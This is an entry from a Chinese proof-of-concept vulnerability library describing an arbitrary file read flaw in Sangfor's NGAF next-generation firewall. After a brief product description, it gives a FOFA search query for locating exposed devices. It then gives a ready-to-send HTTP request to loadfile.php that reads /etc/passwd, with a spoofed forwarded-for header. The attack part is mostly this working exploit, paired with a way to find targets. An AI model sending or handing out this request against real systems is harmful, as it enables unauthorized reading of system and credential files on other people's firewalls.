---
fofa: "title="
source: "wy876 漏洞文库"
---

# 深信服下一代防火墙NGAF loadfile存在任意文件读取漏洞

# 一、漏洞简介
深信服下一代防火墙NGAF专注网络边界安全效果，通过应用丰富的安全创新防御技术和简单易用的产品设计理念，不仅增强网络边界的安全检测与防控能力，而且实现网络安全风险可视化展示与快速处置，让组织网络边界安全建设更有效、更简单。该系统存在任意文件读取漏洞，会造成敏感信息泄露。

# 二、影响版本
+ 深信服下一代防火墙NGAF

# 三、资产测绘
+ fofa`title="SANGFOR | NGAF"`
+ 特征


# 四、漏洞复现
```plain
GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded
y-forwarded-for: 127.0.0.1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xem61o3tiw39r3cr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
